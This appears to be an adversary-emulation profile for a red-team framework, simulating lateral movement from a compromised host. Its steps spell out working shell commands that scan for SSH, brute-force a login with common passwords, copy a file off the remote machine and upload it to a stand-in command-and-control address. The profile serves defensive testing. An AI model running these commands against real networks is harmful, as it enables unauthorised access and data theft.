steps.command: pwd=$(cat /tmp/.ssh_cred 2>/dev/null); [ -n "$pwd" ] || pwd="password123"; remote_file=$(sshpass -p "$pwd" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o LogLevel=ERROR agent@192.168.1.2 "find / -name '*.png' -type f -size -500k 2>/dev/null | head -1" 2>/dev/null); echo "REMOTE_FILE_FOUND:$remote_file"; [ -n "$remote_file" ] || { echo "NO_REMOTE_FILES"; false; }; sshpass -p "$pwd" scp -o StrictHostKeyChecking=no -o LogLevel=ERROR agent@192.168.1.2:"$remote_file" /tmp/lateral_collected_file 2>/dev/null; echo "REMOTE_FILE_STAGED:/tmp/lateral_collected_file"; ls -la /tmp/lateral_collected_file || false
steps.plaintext_command: pwd=$(cat /tmp/.ssh_cred 2>/dev/null); [ -n "$pwd" ] || pwd="password123"; remote_file=$(sshpass -p "$pwd" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o LogLevel=ERROR agent@192.168.1.2 "find / -name '*.png' -type f -size -500k 2>/dev/null | head -1" 2>/dev/null); echo "REMOTE_FILE_FOUND:$remote_file"; [ -n "$remote_file" ] || { echo "NO_REMOTE_FILES"; false; }; sshpass -p "$pwd" scp -o StrictHostKeyChecking=no -o LogLevel=ERROR agent@192.168.1.2:"$remote_file" /tmp/lateral_collected_file 2>/dev/null; echo "REMOTE_FILE_STAGED:/tmp/lateral_collected_file"; ls -la /tmp/lateral_collected_file || false

steps.command: pwd=$(cat /tmp/.ssh_cred 2>/dev/null); [ -n "$pwd" ] || pwd="password123"; result=$(sshpass -p "$pwd" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o LogLevel=ERROR agent@192.168.1.2 "hostname && id && uname -a" 2>/dev/null); echo "$result"; echo "$result" | grep -q "Linux" || { echo "LATERAL_MOVEMENT_FAILED"; false; }; echo "LATERAL_HOST:$(echo "$result" | head -1)"

steps.command: rm -f /tmp/.ssh_cred; for pwd in password password123 admin admin123 root 123456 letmein agent "password123"; do result=$(sshpass -p "$pwd" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no -o LogLevel=ERROR agent@192.168.1.2 "echo AUTH_SUCCESS" 2>/dev/null); if echo "$result" | grep -q "AUTH_SUCCESS"; then echo "BRUTE_FORCE_SUCCESS:$pwd"; echo "$pwd" > /tmp/.ssh_cred; break; fi; done; found=$(cat /tmp/.ssh_cred 2>/dev/null); [ -n "$found" ] || { echo "BRUTE_FORCE_FAILED"; false; }
steps.plaintext_command: rm -f /tmp/.ssh_cred; for pwd in password password123 admin admin123 root 123456 letmein agent "password123"; do result=$(sshpass -p "$pwd" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no -o LogLevel=ERROR agent@192.168.1.2 "echo AUTH_SUCCESS" 2>/dev/null); if echo "$result" | grep -q "AUTH_SUCCESS"; then echo "BRUTE_FORCE_SUCCESS:$pwd"; echo "$pwd" > /tmp/.ssh_cred; break; fi; done; found=$(cat /tmp/.ssh_cred 2>/dev/null); [ -n "$found" ] || { echo "BRUTE_FORCE_FAILED"; false; }

steps.command: if ping -c 3 -W 2 192.168.1.2 > /dev/null 2>&1; then echo "LAN_REACHABLE:true"; else echo "LAN_REACHABLE:false"; false; fi
steps.plaintext_command: if ping -c 3 -W 2 192.168.1.2 > /dev/null 2>&1; then echo "LAN_REACHABLE:true"; else echo "LAN_REACHABLE:false"; false; fi
steps.description: Checks inter-network connectivity by pinging a target host on the LAN. The target IP is defined by the fact 'lan.target.ip'.
steps.name: LAN Connectivity Check (Ping)

steps.command: result=$(nmap -p 22 --open -T4 192.168.1.2 2>/dev/null); echo "$result"; if echo "$result" | grep -q "22/tcp open"; then echo "SSH_PORT_OPEN:192.168.1.2"; else echo "SSH_PORT_CLOSED:192.168.1.2"; false; fi
steps.plaintext_command: result=$(nmap -p 22 --open -T4 192.168.1.2 2>/dev/null); echo "$result"; if echo "$result" | grep -q "22/tcp open"; then echo "SSH_PORT_OPEN:192.168.1.2"; else echo "SSH_PORT_CLOSED:192.168.1.2"; false; fi
steps.description: Use nmap to confirm SSH (port 22) is open on the lateral movement target
steps.name: Scan target for open SSH port

steps.command: wget -q -T 4 --tries=3 --max-redirect=0 -O /dev/null http://1.1.1.1 2>/dev/null; ec=$?; if [ $ec -eq 0 -o $ec -eq 8 ]; then echo "HTTP_STATUS:200"; else echo "HTTP_STATUS:000"; false; fi
steps.plaintext_command: wget -q -T 4 --tries=3 --max-redirect=0 -O /dev/null http://1.1.1.1 2>/dev/null; ec=$?; if [ $ec -eq 0 -o $ec -eq 8 ]; then echo "HTTP_STATUS:200"; else echo "HTTP_STATUS:000"; false; fi
steps.description: Deadman ability that verifies internet connectivity by making an HTTP GET request to a well-known public endpoint. Uses wget instead of ping (ICMP) to test TCP-based network reachability. Returns the HTTP status code.
steps.name: Internet Connectivity Check (HTTP)

steps.command: status=$(curl -k -s --interface eth0 -o /dev/null -w "%{http_code}" -F "data=@/tmp/lateral_collected_file" --header "X-Request-ID: lateral-hwiovr" https://203.0.113.1:8443/file/upload); echo "EXFIL_STATUS:$status"; [ "$status" = "200" ] || false

adversary.name: Lateral_Movement
adversary.description: Simulates east-west lateral movement: scan for SSH on a LAN target, brute-force credentials, move laterally via SSH, enumerate and collect files from the remote host, then exfiltrate to C2.

objectives.name: default
objectives.description: This is a default objective that runs forever.
